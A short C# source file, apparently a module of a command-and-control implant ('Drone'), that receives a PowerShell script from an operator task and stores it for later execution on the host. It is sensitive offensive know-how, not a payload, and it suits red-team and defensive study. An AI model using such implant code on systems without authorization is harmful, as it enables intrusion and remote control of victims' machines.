using System.Text;
using Drone.Models;

namespace Drone.Functions;

public class PowerShellImport : DroneFunction
{
    public override string Name => "powershell-import";
    
    public override void Execute(DroneTask task)
    {
        ImportedScript = Encoding.ASCII.GetString(task.Artefact);
        Drone.SendOutput(task.TaskId, $"Imported {task.Artefact.Length} bytes.");
    }

    public static string ImportedScript { get; private set; }
}